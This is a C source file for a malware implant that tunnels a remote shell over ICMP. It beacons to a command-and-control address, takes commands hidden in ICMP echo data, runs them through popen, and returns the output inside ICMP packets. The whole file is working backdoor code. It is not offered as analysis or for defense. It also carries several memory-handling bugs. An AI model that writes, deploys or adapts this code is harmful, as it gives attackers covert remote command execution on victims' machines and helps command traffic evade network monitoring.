#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include "../include/implant.h"

// creates a raw ICMP socket and binds it
int create_socket(void) {
    int sockfd;

    // create the raw ICMP socket
    if ((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
        perror("socket()");
        exit(-1);
    }

    return sockfd;
}

// calculates checksum (proudly? stolen from the internet)
unsigned short cksum(unsigned short *addr, int len) {
    int nleft = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;

    while (nleft > 1) {
      sum += *w++;
      nleft -= 2;
    }

    if (nleft == 1) {
      *(unsigned char *)(&answer) = *(unsigned char *)w;
      sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    
    return answer;
}

// runs the command from the C2 and returns the output
char *invoke_command(char *data) {
    FILE *ptr;
    char *temp_buffer = (char *) calloc(4096, 1);
    char *buffer;
    char *command;

    data[strlen(data)-1] = '\0'; // strip the newline

    command = strcat(data, " 2>&1"); // redirect stderr to stdout


    ptr = popen(command, "r");
    if (ptr == NULL) {
        perror("popen()");
        return NULL;
    }

    fread(temp_buffer, 4096, 1, ptr);

    buffer = calloc(strlen(temp_buffer), 1);
    strncpy(buffer, temp_buffer, strlen(temp_buffer));

    free(temp_buffer);
    pclose(ptr);

    return buffer;
}

// reads from the socket and put it in the buffer
int read_from_socket(int sockfd, char *buffer, int size) {
    int bytes_num = read(sockfd, buffer, size);

    if (bytes_num < 0) {
        perror("read()");
        return 0;
    }

    return 1;
}

// sends a beacon to the C2
int send_beacon(int sockfd, char *dst_ip) {
    char *packet;
    struct icmphdr *icmp;
    int packet_size = sizeof(struct icmphdr *);
    int bytes_num;
    struct sockaddr_in dst;
    
    packet = (char *) malloc(packet_size);

    // setting the IP options
    dst.sin_family = AF_INET;
    inet_aton(dst_ip, &dst.sin_addr);

    // setting the ICMP options
    icmp = (struct icmphdr *) packet;
	icmp->type = 8;
	icmp->code = 8;
	icmp->un.echo.id = 9001;
    icmp->checksum = cksum((unsigned short *) icmp, packet_size);

    bytes_num = sendto(sockfd, icmp, sizeof(struct icmphdr), 0, (struct sockaddr *) &dst, sizeof(dst));
    if (bytes_num < 0) {
        perror("sendto()");
        free(packet);
        return -1;
    }

    free(packet);

    return 1;
}

// check if we got an actual connection from our C2
int check_magic_byte(struct icmphdr *icmp) {

    if (icmp->type == 8 && icmp->un.echo.id == 9001) {
        return 1;
    }

    return 0;
}

// the actual interaction occurs here
void interact(int sockfd, char *dest_ip) {
    struct iphdr *ip; // holds the IP header
    struct icmphdr *icmp; // holds the ICMP header
    char *data; // holds the ICMP's data section
    char *output; // holds the output of the command
    char *packet; // holds the packet
    struct sockaddr_in addr;
    size_t bytes_num, packet_size; 

    // calculating the packet size
    packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr) + BUFFER_SIZE;

    // allocating a buffer to store the recieved ICMP packet
    packet = (char *) malloc(packet_size);
    data = (char *) malloc(BUFFER_SIZE);

    if (packet == NULL || data == NULL) {
        fprintf(stdout, "Error: Cannot allocate memory\n");
        free(packet);
        close(sockfd);
    }

    while (1) {
        // send a beacon and wait for commands
        // gotta figure out how to better control it
        send_beacon(sockfd, dest_ip);

        if (!read_from_socket(sockfd, packet, packet_size)) {
            perror("read()");
            break;
        }

        ip = (struct iphdr *) packet;
        icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));

        // set the IP & ICMP headers for later usage
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = ip->saddr;
        icmp->type = 0;

        // get the data section (ignoring the IP & ICMP headers + ICMP time data + junk prefix bytes)
        data = (char *) (packet + sizeof(struct iphdr) + sizeof(struct icmphdr));
        data[BUFFER_SIZE] = '\0';

        // invoke the command
        output = invoke_command(data);

        // put the output in the data section of the ICMP packet
        memcpy((char *) data, output, strlen(output));

        // calculate the checksum
        icmp->checksum = 0; // needs to be set before calculating for some weird reason
        icmp->checksum = cksum((unsigned short *) icmp, sizeof(struct icmphdr) + strlen(output));

        // send it
        bytes_num = sendto(sockfd, icmp, sizeof(struct icmphdr) + strlen(output), 0, (struct sockaddr *) &addr, sizeof(addr));
        if (bytes_num < 0) {
            perror("sendto()");
            break;
        }

        // clean up the packet buffer for the next usage
        memset(packet, '\0', packet_size);

        free(output);
    }
  
    free(data);
    free(output);
    free(packet);
    close(sockfd);
}

// initializes the options and starts the implant
void implant_init_n_call(char *dest_ip) {
    int sockfd = create_socket();

    interact(sockfd, dest_ip);
}
